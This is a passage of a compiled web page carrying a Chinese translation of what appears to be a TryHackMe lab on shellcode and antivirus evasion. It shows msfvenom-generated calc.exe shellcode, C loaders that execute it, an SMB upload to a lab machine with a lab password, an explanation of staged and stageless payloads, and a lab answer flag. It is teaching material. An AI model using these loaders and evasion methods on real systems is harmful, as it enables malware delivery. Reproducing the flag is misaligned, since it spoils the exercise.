\u9700\u8981\u4ed8\u51fa\u4e13\u6ce8\u548c\u6280\u80fd\uff01"}),"\n",(0,l.jsx)(n.p,{children:"\u4e3a\u4e86\u786e\u8ba4\u63d0\u53d6\u7684 shellcode \u662f\u5426\u6309\u9884\u671f\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u7684 shellcode \u5e76\u5c06\u5176\u6ce8\u5165\u5230 C \u7a0b\u5e8f\u4e2d\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cpp",children:"#include <stdio.h>\r\n\r\nint main(int argc, char **argv) {\r\n    unsigned char message[] = {\r\n        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,\r\n        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,\r\n        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,\r\n        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,\r\n        0x0d, 0x0a\r\n    };\r\n    \r\n    (*(void(*)())message)();\r\n    return 0;\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\uff0c\u6211\u4eec\u6309\u5982\u4e0b\u65b9\u5f0f\u7f16\u8bd1\u5e76\u6267\u884c\u5b83\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx\r\nuser@AttackBox$ ./thmx\r\nTHM,Rocks!\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u592a\u597d\u4e86\uff01\u5b83\u6b63\u5e38\u5de5\u4f5c\u3002\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u901a\u8fc7\u7981\u7528 NX \u4fdd\u62a4\u6765\u7f16\u8bd1 C \u7a0b\u5e8f\uff0c\u56e0\u4e3a NX \u4fdd\u62a4\u53ef\u80fd\u4f1a\u963b\u6b62\u6211\u4eec\u5728\u6570\u636e\u6bb5\u6216\u6808\u4e2d\u6b63\u786e\u6267\u884c\u4ee3\u7801\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u7406\u89e3 shellcode \u53ca\u5176\u521b\u5efa\u65b9\u5f0f\u5bf9\u4e8e\u63a5\u4e0b\u6765\u7684\u4efb\u52a1\u81f3\u5173\u91cd\u8981\uff0c\u5c24\u5176\u662f\u5728\u5904\u7406 shellcode \u7684\u52a0\u5bc6\u548c\u7f16\u7801\u65f6\u3002"}),"\n",(0,l.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(n.p,{children:"\u4fee\u6539\u4f60\u7684 C \u7a0b\u5e8f\u4ee5\u6267\u884c\u4ee5\u4e0b shellcode\u3002\u6807\u5fd7\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cpp",children:"unsigned char message[] = {\r\n  0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,\r\n  0x34, 0x08, 0x01, 0x48, 0x83, 0xc1, 0x01, 0x48, 0x83, 0xf9, 0x19, 0x75,\r\n  0xf2, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba,\r\n  0x19, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf,\r\n  0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x55,\r\n  0x49, 0x4c, 0x7a, 0x78, 0x31, 0x74, 0x73, 0x2c, 0x30, 0x72, 0x36, 0x2c,\r\n  0x34, 0x69, 0x32, 0x30, 0x30, 0x62, 0x31, 0x65, 0x32, 0x7c, 0x0d, 0x0a\r\n};\n"})}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"THM{y0ur-1s7-5h311c0d3}\n"})})]}),"\n",(0,l.jsx)(n.h2,{id:"generate-shellcode---\u751f\u6210-shellcode",children:"Generate Shellcode - \u751f\u6210 Shellcode"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u8fd9\u4e2a\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u7ee7\u7eed\u5904\u7406 shellcode\uff0c\u5e76\u6f14\u793a\u5982\u4f55\u4f7f\u7528\u50cf Metasploit \u6846\u67b6\u8fd9\u6837\u7684\u516c\u5171\u5de5\u5177\u751f\u6210\u548c\u6267\u884c shellcode\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210-shellcode",children:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210 Shellcode"}),"\n",(0,l.jsx)(n.p,{children:"Shellcode \u53ef\u4ee5\u4e3a\u7279\u5b9a\u683c\u5f0f\u548c\u7279\u5b9a\u7f16\u7a0b\u8bed\u8a00\u751f\u6210\u3002\u8fd9\u53d6\u51b3\u4e8e\u4f60\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4f60\u7684 dropper\uff08\u5373\u4e3b exe \u6587\u4ef6\uff09\u5305\u542b\u5c06\u53d1\u9001\u7ed9\u53d7\u5bb3\u8005\u7684 shellcode\uff0c\u5e76\u4e14\u7528 C \u7f16\u5199\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u9002\u7528\u4e8e C \u7684 shellcode \u683c\u5f0f\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u901a\u8fc7\u516c\u5171\u5de5\u5177\u751f\u6210 shellcode \u7684\u4f18\u70b9\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4ece\u5934\u5f00\u59cb\u5236\u4f5c\u81ea\u5b9a\u4e49 shellcode\uff0c\u751a\u81f3\u4e0d\u9700\u8981\u7cbe\u901a\u6c47\u7f16\u8bed\u8a00\u3002\u5927\u591a\u6570\u516c\u5171 C2 \u6846\u67b6\u63d0\u4f9b\u4e0e C2 \u5e73\u53f0\u517c\u5bb9\u7684 shellcode \u751f\u6210\u5668\u3002\u5f53\u7136\uff0c\u8fd9\u5bf9\u6211\u4eec\u6765\u8bf4\u975e\u5e38\u65b9\u4fbf\uff0c\u4f46\u7f3a\u70b9\u662f\u5927\u591a\u6570\uff0c\u6216\u8005\u53ef\u4ee5\u8bf4\u6240\u6709\u751f\u6210\u7684 shellcode \u90fd\u662f AV \u5382\u5546\u719f\u77e5\u7684\uff0c\u5bb9\u6613\u88ab\u68c0\u6d4b\u5230\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u6211\u4eec\u5c06\u5728 AttackBox \u4e0a\u4f7f\u7528 Msfvenom \u751f\u6210\u4e00\u4e2a\u6267\u884c Windows \u6587\u4ef6\u7684 shellcode\u3002\u6211\u4eec\u5c06\u521b\u5efa\u4e00\u4e2a\u8fd0\u884c ",(0,l.jsx)(n.code,{children:"calc.exe"})," \u5e94\u7528\u7a0b\u5e8f\u7684 shellcode\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c\r\nNo encoder specified, outputting raw payload\r\nPayload size: 193 bytes\r\nFinal size of c file: 835 bytes\r\nunsigned char buf[] =\r\n"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30"\r\n"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff"\r\n"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52"\r\n"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1"\r\n"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b"\r\n"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03"\r\n"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b"\r\n"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24"\r\n"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb"\r\n"\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f"\r\n"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5"\r\n"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a"\r\n"\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00";\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u56e0\u6b64\uff0cMetasploit \u6846\u67b6\u751f\u6210\u4e86\u4e00\u4e2a\u6267\u884c Windows \u8ba1\u7b97\u5668 (",(0,l.jsx)(n.code,{children:"calc.exe"}),") \u7684 shellcode\u3002Windows \u8ba1\u7b97\u5668\u4f5c\u4e3a\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u5e38\u7528\u7684\u793a\u4f8b\uff0c\u7528\u4e8e\u5c55\u793a\u6982\u5ff5\u9a8c\u8bc1\u3002\u5982\u679c\u8be5\u6280\u672f\u6709\u6548\uff0c\u5219\u4f1a\u5f39\u51fa\u4e00\u4e2a\u65b0\u7684 Windows \u8ba1\u7b97\u5668\u5b9e\u4f8b\u3002\u8fd9\u786e\u8ba4\u4e86\u4f7f\u7528\u7684\u65b9\u6cd5\u80fd\u591f\u6210\u529f\u6267\u884c\u4efb\u4f55\u53ef\u6267\u884c\u7684 shellcode\u3002"]}),"\n",(0,l.jsx)(n.h3,{id:"shellcode-\u6ce8\u5165",children:"Shellcode \u6ce8\u5165"}),"\n",(0,l.jsx)(n.p,{children:"\u9ed1\u5ba2\u901a\u8fc7\u5404\u79cd\u6280\u672f\u5c06 shellcode \u6ce8\u5165\u5230\u6b63\u5728\u8fd0\u884c\u7684\u6216\u65b0\u7684\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u4e2d\u3002Shellcode \u6ce8\u5165\u6280\u672f\u4fee\u6539\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u66f4\u65b0\u7a0b\u5e8f\u7684\u5bc4\u5b58\u5668\u548c\u51fd\u6570\uff0c\u4ee5\u6267\u884c\u653b\u51fb\u8005\u7684\u4ee3\u7801\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u7ee7\u7eed\u4f7f\u7528\u751f\u6210\u7684 shellcode\uff0c\u5e76\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\u5b83\u3002\u4ee5\u4e0b\u662f\u5305\u542b\u6211\u4eec\u751f\u6210\u7684 shellcode \u7684 C \u4ee3\u7801\uff0c\u8be5 shellcode \u5c06\u88ab\u6ce8\u5165\u5230\u5185\u5b58\u4e2d\u5e76\u6267\u884c ",(0,l.jsx)(n.code,{children:"calc.exe"}),"\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u5728 AttackBox \u4e0a\uff0c\u8ba9\u6211\u4eec\u5c06\u4ee5\u4e0b\u5185\u5bb9\u4fdd\u5b58\u4e3a\u540d\u4e3a ",(0,l.jsx)(n.code,{children:"calc.c"})," \u7684\u6587\u4ef6\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cpp",children:'#include <windows.h>\r\nchar stager[] = {\r\n"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30"\r\n"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff"\r\n"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52"\r\n"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1"\r\n"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b"\r\n"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03"\r\n"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b"\r\n"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24"\r\n"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb"\r\n"\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f"\r\n"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5"\r\n"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a"\r\n"\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00" };\r\nint main()\r\n{\r\n        DWORD oldProtect;\r\n        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);\r\n        int (*shellcode)() = (int(*)())(void*)stager;\r\n        shellcode();\r\n}\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u73b0\u5728\u8ba9\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3a\u4e00\u4e2a exe \u6587\u4ef6\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u4e00\u65e6\u6211\u4eec\u6709\u4e86 exe \u6587\u4ef6\uff0c\u63a5\u4e0b\u6765\u5c06\u5b83\u4f20\u8f93\u5230 Windows \u673a\u5668\u5e76\u6267\u884c\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"smbclient"})," \u4ece\u4f60\u7684 AttackBox \u8bbf\u95ee SMB \u5171\u4eab ",(0,l.jsx)(n.code,{children:"\\\\10.10.14.106\\Tools"}),"\uff0c\u5e76\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u4f20\u8f93\u6587\u4ef6\uff08\u8bb0\u5f97 ",(0,l.jsx)(n.code,{children:"thm"})," \u7528\u6237\u7684\u5bc6\u7801\u662f ",(0,l.jsx)(n.code,{children:"Password321"}),"\uff09\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ smbclient -U thm '//10.10.14.106/Tools'\r\nsmb: \\> put calc-MSF.exe\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u8fd9\u5e94\u8be5\u4f1a\u5c06\u4f60\u7684\u6587\u4ef6\u590d\u5236\u5230 Windows \u673a\u5668\u4e0a\u7684 ",(0,l.jsx)(n.code,{children:"C:\\Tools\\"})," \u76ee\u5f55\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u867d\u7136\u4f60\u7684\u673a\u5668\u7684 AV \u5e94\u8be5\u5df2\u88ab\u7981\u7528\uff0c\u4f46\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u4f60\u7684\u6709\u6548\u8f7d\u8377\u4e0a\u4f20\u5230 THM Antivirus Check\uff0c\u7f51\u5740\u4e3a ",(0,l.jsx)(n.code,{children:"http://10.10.14.106/"}),"\u3002"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Executing MSF Payload to run calc.exe",src:s(5727).A+"",width:"1240",height:"599"})}),"\n",(0,l.jsx)(n.p,{children:"Metasploit \u6846\u67b6\u63d0\u4f9b\u4e86\u8bb8\u591a\u5176\u4ed6\u7684 shellcode \u683c\u5f0f\u548c\u7c7b\u578b\uff0c\u6ee1\u8db3\u4f60\u6240\u6709\u7684\u9700\u6c42\u3002\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u4f60\u591a\u505a\u5b9e\u9a8c\uff0c\u901a\u8fc7\u751f\u6210\u4e0d\u540c\u7684 shellcode \u6765\u6269\u5c55\u4f60\u7684\u77e5\u8bc6\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4e4b\u524d\u7684\u793a\u4f8b\u5c55\u793a\u4e86\u5982\u4f55\u751f\u6210 shellcode \u5e76\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u3002\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u590d\u5236\u76f8\u540c\u7684\u6b65\u9aa4\u6765\u521b\u5efa\u4e0d\u540c\u7c7b\u578b\u7684 shellcode\uff0c\u4f8b\u5982 Meterpreter shellcode\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u4ece-exe-\u6587\u4ef6\u751f\u6210-shellcode",children:"\u4ece EXE \u6587\u4ef6\u751f\u6210 Shellcode"}),"\n",(0,l.jsxs)(n.p,{children:["Shellcode \u4e5f\u53ef\u4ee5\u5b58\u50a8\u5728 ",(0,l.jsx)(n.code,{children:".bin"})," \u6587\u4ef6\u4e2d\uff0c\u8fd9\u662f\u4e00\u79cd\u539f\u59cb\u6570\u636e\u683c\u5f0f\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"xxd -i"})," \u547d\u4ee4\u63d0\u53d6\u5176\u4e2d\u7684 shellcode\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["C2 \u6846\u67b6\u63d0\u4f9b\u7684 shellcode \u901a\u5e38\u662f\u539f\u59cb\u4e8c\u8fdb\u5236\u6587\u4ef6 ",(0,l.jsx)(n.code,{children:".bin"})," \u683c\u5f0f\u3002\u5982\u679c\u662f\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Linux \u7cfb\u7edf\u547d\u4ee4 ",(0,l.jsx)(n.code,{children:"xxd"})," \u83b7\u53d6\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u8868\u793a\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a",(0,l.jsx)(n.code,{children:"xxd -i"}),"\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u4f7f\u7528 msfvenom \u521b\u5efa\u4e00\u4e2a\u539f\u59cb\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u83b7\u53d6 shellcode\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin\r\nNo encoder specified, outputting raw payload\r\nPayload size: 193 bytes\r\n\r\nuser@AttackBox$ file /tmp/example.bin\r\n/tmp/example.bin: data\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u7136\u540e\u5728\u521b\u5efa\u7684\u6587\u4ef6\u4e0a\u8fd0\u884c ",(0,l.jsx)(n.code,{children:"xxd"})," \u547d\u4ee4\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ xxd -i /tmp/example.bin\r\nunsigned char _tmp_example_bin[] = {\r\n  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,\r\n  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,\r\n  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,\r\n  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,\r\n  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,\r\n  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,\r\n  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,\r\n  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,\r\n  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,\r\n  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,\r\n  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,\r\n  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,\r\n  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,\r\n  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,\r\n  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,\r\n  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,\r\n  0x00\r\n};\r\nunsigned int _tmp_example_bin_len = 193;\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u6211\u4eec\u5c06\u8f93\u51fa\u4e0e\u4e4b\u524d\u4f7f\u7528 Metasploit \u521b\u5efa\u7684 shellcode \u8fdb\u884c\u6bd4\u8f83\uff0c\u4f1a\u53d1\u73b0\u5b83\u4eec\u662f\u5339\u914d\u7684\u3002"}),"\n",(0,l.jsx)(n.h2,{id:"staged-payloads---\u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377",children:"Staged Payloads - \u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377"}),"\n",(0,l.jsxs)(n.p,{children:["\u4e3a\u4e86\u7ed5\u8fc7\u6740\u6bd2\u8f6f\u4ef6\uff0c\u6211\u4eec\u5c06\u627e\u5230\u4e24\u79cd\u4e3b\u8981\u7684\u65b9\u6cd5\u6765\u5c06\u6700\u7ec8\u7684 shellcode \u4f20\u9012\u7ed9\u53d7\u5bb3\u8005\u3002\u6839\u636e\u65b9\u6cd5\u7684\u4e0d\u540c\uff0c\u8f7d\u8377\u901a\u5e38\u5206\u4e3a",(0,l.jsx)(n.strong,{children:"\u5206\u9636\u6bb5"}),"\u548c",(0,l.jsx)(n.strong,{children:"\u65e0\u9636\u6bb5"}),"\u8f7d\u8377\u3002\u5728\u8fd9\u9879\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u63a2\u8ba8\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684\u533a\u522b\u4ee5\u53ca\u5404\u81ea\u7684\u4f18\u70b9\u3002"]}),"\n",(0,l.jsx)(n.h3,{id:"\u65e0\u9636\u6bb5\u8f7d\u8377",children:"\u65e0\u9636\u6bb5\u8f7d\u8377"}),"\n",(0,l.jsxs)(n.p,{children:["\u65e0\u9636\u6bb5\u8f7d\u8377\u5c06\u6700\u7ec8\u7684 shellcode \u76f4\u63a5\u5d4c\u5165\u5230\u81ea\u8eab\u4e2d\u3002\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a\u6253\u5305\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u80fd\u591f\u5728\u5355\u4e00\u6b65\u9aa4\u4e2d\u6267\u884c shellcode\u3002\u5728\u4e4b\u524d\u7684\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5d4c\u5165\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5d4c\u5165\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 ",(0,l.jsx)(n.code,{children:"calc"})," shellcode\uff0c\u8fd9\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u65e0\u9636\u6bb5\u8f7d\u8377\u3002"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Stageless Payload",src:s(239).A+"",width:"1298",height:"342"})}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u5f53\u7528\u6237\u6267\u884c\u6076\u610f\u8f7d\u8377\u65f6\uff0c\u5d4c\u5165\u7684 shellcode \u5c06\u8fd0\u884c\uff0c\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u4e00\u4e2a\u53cd\u5411 shell\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u5206\u9636\u6bb5\u8f7d\u8377",children:"\u5206\u9636\u6bb5\u8f7d\u8377"}),"\n",(0,l.jsxs)(n.p,{children:["\u5206\u9636\u6bb5\u8f7d\u8377\u901a\u8fc7\u4f7f\u7528\u4e2d\u4ecb shellcode \u6765\u5de5\u4f5c\uff0c\u8fd9\u4e9b\u4e2d\u4ecb shellcode \u4f5c\u4e3a\u6b65\u9aa4\uff0c\u6700\u7ec8\u6267\u884c\u6700\u7ec8\u7684 shellcode\u3002\u6bcf\u4e00\u4e2a\u4e2d\u4ecb shellcode \u88ab\u79f0\u4e3a",(0,l.jsx)(n.strong,{children:"\u9636\u6bb5\u5668"}),"\uff08stager\uff09\uff0c\u5176\u4e3b\u8981\u76ee\u6807\u662f\u63d0\u4f9b\u4e00\u79cd\u65b9\u6cd5\uff0c\u7528\u4e8e\u83b7\u53d6\u6700\u7ec8\u7684 shellcode \u5e76\u6700\u7ec8\u6267\u884c\u5b83\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u867d\u7136\u53ef\u80fd\u5b58\u5728\u5177\u6709\u591a\u4e2a\u9636\u6bb5\u7684\u8f7d\u8377\uff0c\u4f46\u901a\u5e38\u7684\u60c5\u51b5\u662f\u91c7\u7528\u4e24\u9636\u6bb5\u8f7d\u8377\uff0c\u5176\u4e2d\u7b2c\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a",(0,l.jsx)(n.strong,{children:"stage0"}),"\uff0c\u662f\u4e00\u4e2a\u8fde\u63a5\u56de\u653b\u51fb\u8005\u673a\u5668\u7684 stub shellcode\uff0c\u7528\u4e8e\u4e0b\u8f7d\u6700\u7ec8\u8981\u6267\u884c\u7684 shellcode\u3002"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Staged Payload - stage0",src:s(4207).A+"",width:"1298",height:"342"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u65e6\u83b7\u53d6 stage0 \u5b58\u6839\uff0c\u5b83\u5c06\u628a\u6700\u7ec8\u7684 shellcode \u6ce8\u5165\u5230\u6709\u6548\u8d1f\u8f7d\u8fdb\u7a0b\u7684\u5185\u5b58\u4e2d\u7684\u67d0\u4e2a\u4f4d\u7f6e\u5e76\u6267\u884c\uff08\u5982\u4e0b\u6240\u793a\uff09\u3002"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Staged Payload - Send ReveseShell",src:s(7966).A+"",width:"1281",height:"342"})}),"\n",(0,l.jsx)(n.h3,{id:"\u5206\u9636\u6bb5-vs-\u65e0\u9636\u6bb5",children:"\u5206\u9636\u6bb5 vs. 